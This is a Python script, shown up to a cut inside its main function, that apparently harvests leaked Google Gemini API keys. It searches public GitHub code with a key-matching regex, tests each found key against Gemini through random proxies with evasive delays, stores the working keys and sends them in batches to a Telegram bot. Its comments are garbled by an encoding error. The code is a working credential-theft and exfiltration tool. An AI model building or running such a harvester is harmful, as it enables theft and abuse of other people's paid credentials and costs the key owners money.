import os
import random
import re
import sys
import time
import traceback
import threading
import requests
from datetime import datetime, timedelta
from typing import Dict, List, Union, Any
from http.server import BaseHTTPRequestHandler, HTTPServer

import google.generativeai as genai
from google.api_core import exceptions as google_exceptions

from common.Logger import logger

sys.path.append('../')
from common.config import Config
from utils.github_client import GitHubClient
from utils.file_manager import file_manager, Checkpoint, checkpoint
from utils.sync_utils import sync_utils

# --- Telegram å®šæ—¶å‘é€ç›¸å…³å˜é‡ ---
LAST_TG_SEND_TIME = time.time()
PENDING_KEYS_TO_SEND = []

# åˆ›å»ºGitHubå·¥å…·å®ä¾‹å’Œæ–‡ä»¶ç®¡ç†å™¨
github_utils = GitHubClient.create_instance(Config.GITHUB_TOKENS)

# ç»Ÿè®¡ä¿¡æ¯
skip_stats = {
    "time_filter": 0,
    "sha_duplicate": 0,
    "age_filter": 0,
    "doc_filter": 0
}

# --- å¥åº·æ£€æŸ¥ Web æœåŠ¡ç±» ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        return  # ç¦ç”¨æ—¥å¿—

def start_health_check_server():
    port = int(os.environ.get("PORT", 8000))
    server = HTTPServer(('0.0.0.0', port), HealthCheckHandler)
    logger.info(f"ğŸ‘» Health check server started on port {port}")
    server.serve_forever()

# --- ä¿®æ”¹åï¼šTelegram å‘é€å‡½æ•° (æ”¯æŒé•¿æ¶ˆæ¯) ---
def send_telegram_summary():
    global LAST_TG_SEND_TIME, PENDING_KEYS_TO_SEND
    
    token = os.getenv("TG_BOT_TOKEN")
    chat_id = os.getenv("TG_CHAT_ID")
    
    if not token or not chat_id or not PENDING_KEYS_TO_SEND:
        PENDING_KEYS_TO_SEND = []
        LAST_TG_SEND_TIME = time.time()
        return

    # æ„é€ æ¶ˆæ¯å¤´éƒ¨
    header = f"ğŸ“Š ã€æ¯å°æ—¶æŠ“å–æ±‡æ€»ã€‘\n"
    header += f"â° æ—¶é—´: {datetime.now().strftime('%m-%d %H:%M')}\n"
    header += f"âœ¨ æ–°å‘ç°æœ‰æ•ˆ Key: {len(PENDING_KEYS_TO_SEND)} ä¸ª\n\n"
    
    # æ‹¼æ¥æ‰€æœ‰ Key
    all_keys_text = "\n".join(PENDING_KEYS_TO_SEND)
    full_message = header + all_keys_text

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    
    try:
        # Telegram å•æ¡æ¶ˆæ¯ä¸Šé™çº¦ 4096 å­—ç¬¦ï¼Œè¿™é‡Œä¿å®ˆå– 3500 è¿›è¡Œåˆ†æ®µ
        MAX_LENGTH = 3500
        if len(full_message) <= MAX_LENGTH:
            requests.post(url, json={"chat_id": chat_id, "text": full_message}, timeout=15)
        else:
            # å¦‚æœå†…å®¹è¿‡é•¿ï¼Œåˆ†æ®µå‘é€
            parts = [full_message[i:i+MAX_LENGTH] for i in range(0, len(full_message), MAX_LENGTH)]
            for index, part in enumerate(parts):
                msg_text = part
                if len(parts) > 1:
                    msg_text = f"å†…å®¹è¾ƒé•¿ï¼Œæ­£åœ¨å‘é€ç¬¬ {index+1}/{len(parts)} éƒ¨åˆ†ï¼š\n\n" + part
                requests.post(url, json={"chat_id": chat_id, "text": msg_text}, timeout=15)
                time.sleep(1) # é¿å…è§¦å‘ TG é¢‘ç‡é™åˆ¶
                
        logger.info(f"ğŸ“¤ å·²å‘ Telegram å‘é€æ±‡æ€»æŠ¥å‘Šï¼ŒåŒ…å« {len(PENDING_KEYS_TO_SEND)} ä¸ª Key")
    except Exception as e:
        logger.error(f"âŒ Telegram å‘é€å¤±è´¥: {e}")
    
    # æ¸…ç©ºæš‚å­˜åŒºå¹¶é‡ç½®æ—¶é—´
    PENDING_KEYS_TO_SEND = []
    LAST_TG_SEND_TIME = time.time()

def normalize_query(query: str) -> str:
    query = " ".join(query.split())
    parts = []
    i = 0
    while i < len(query):
        if query[i] == '"':
            end_quote = query.find('"', i + 1)
            if end_quote != -1:
                parts.append(query[i:end_quote + 1])
                i = end_quote + 1
            else:
                parts.append(query[i])
                i += 1
        elif query[i] == ' ':
            i += 1
        else:
            start = i
            while i < len(query) and query[i] != ' ':
                i += 1
            parts.append(query[start:i])

    quoted_strings, language_parts, filename_parts, path_parts, other_parts = [], [], [], [], []
    for part in parts:
        if part.startswith('"') and part.endswith('"'): quoted_strings.append(part)
        elif part.startswith('language:'): language_parts.append(part)
        elif part.startswith('filename:'): filename_parts.append(part)
        elif part.startswith('path:'): path_parts.append(part)
        elif part.strip(): other_parts.append(part)

    normalized_parts = sorted(quoted_strings) + sorted(other_parts) + sorted(language_parts) + sorted(filename_parts) + sorted(path_parts)
    return " ".join(normalized_parts)

def extract_keys_from_content(content: str) -> List[str]:
    pattern = r'(AIzaSy[A-Za-z0-9\-_]{33})'
    return re.findall(pattern, content)

def should_skip_item(item: Dict[str, Any], checkpoint: Checkpoint) -> tuple[bool, str]:
    if checkpoint.last_scan_time:
        try:
            last_scan_dt = datetime.fromisoformat(checkpoint.last_scan_time)
            repo_pushed_at = item["repository"].get("pushed_at")
            if repo_pushed_at:
                repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_pushed_dt <= last_scan_dt:
                    skip_stats["time_filter"] += 1
                    return True, "time_filter"
        except: pass

    if item.get("sha") in checkpoint.scanned_shas:
        skip_stats["sha_duplicate"] += 1
        return True, "sha_duplicate"

    repo_pushed_at = item["repository"].get("pushed_at")
    if repo_pushed_at:
        repo_pushed_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
        if repo_pushed_dt < datetime.utcnow() - timedelta(days=Config.DATE_RANGE_DAYS):
            skip_stats["age_filter"] += 1
            return True, "age_filter"

    lowercase_path = item["path"].lower()
    if any(token in lowercase_path for token in Config.FILE_PATH_BLACKLIST):
        skip_stats["doc_filter"] += 1
        return True, "doc_filter"

    return False, ""

def process_item(item: Dict[str, Any]) -> tuple:
    delay = random.uniform(1, 4)
    file_url = item["html_url"]
    repo_name = item["repository"]["full_name"]
    file_path = item["path"]
    time.sleep(delay)

    content = github_utils.get_file_content(item)
    if not content:
        logger.warning(f"âš ï¸ Failed to fetch content for file: {file_url}")
        return 0, 0

    keys = extract_keys_from_content(content)
    filtered_keys = []
    for key in keys:
        context_index = content.find(key)
        if context_index != -1:
            snippet = content[context_index:context_index + 45]
            if "..." in snippet or "YOUR_" in snippet.upper(): continue
        filtered_keys.append(key)
    
    keys = list(set(filtered_keys))
    if not keys: return 0, 0

    logger.info(f"ğŸ”‘ Found {len(keys)} suspected key(s), validating...")
    valid_keys, rate_limited_keys = [], []

    for key in keys:
        validation_result = validate_gemini_key(key)
        if validation_result and "ok" in validation_result:
            valid_keys.append(key)
            logger.info(f"âœ… VALID: {key}")
        elif validation_result == "rate_limited":
            rate_limited_keys.append(key)
            logger.warning(f"âš ï¸ RATE LIMITED: {key}")
        else:
            logger.info(f"âŒ INVALID: {key}, check result: {validation_result}")

    if valid_keys:
        file_manager.save_valid_keys(repo_name, file_path, file_url, valid_keys)
        # å­˜å…¥å®šæ—¶å‘é€æš‚å­˜åŒº
        PENDING_KEYS_TO_SEND.extend(valid_keys)
        try:
            sync_utils.add_keys_to_queue(valid_keys)
            logger.info(f"ğŸ“¥ Added {len(valid_keys)} key(s) to sync queues")
        except Exception as e:
            logger.error(f"ğŸ“¥ Error adding keys: {e}")

    if rate_limited_keys:
        file_manager.save_rate_limited_keys(repo_name, file_path, file_url, rate_limited_keys)

    return len(valid_keys), len(rate_limited_keys)

def validate_gemini_key(api_key: str) -> Union[bool, str]:
    try:
        time.sleep(random.uniform(0.5, 1.5))
        proxy_config = Config.get_random_proxy()
        client_options = {"api_endpoint": "generativelanguage.googleapis.com"}
        if proxy_config: os.environ['grpc_proxy'] = proxy_config.get('http')

        genai.configure(api_key=api_key, client_options=client_options)
        model = genai.GenerativeModel(Config.HAJIMI_CHECK_MODEL)
        model.generate_content("hi")
        return "ok"
    except (google_exceptions.PermissionDenied, google_exceptions.Unauthenticated): return "not_authorized_key"
    except google_exceptions.TooManyRequests: return "rate_limited"
    except Exception as e:
        if any(x in str(e).lower() for x in ["429", "rate limit", "quota"]): return "rate_limited:429"
        elif any(x in str(e) for x in ["403", "SERVICE_DISABLED", "API has not been used"]): return "disabled"
        else: return f"error:{e.__class__.__name__}"

def main():
    threading.Thread(target=start_health_check_server, daemon=True).start()

    start_time = datetime.now()
    logger.info("=" *
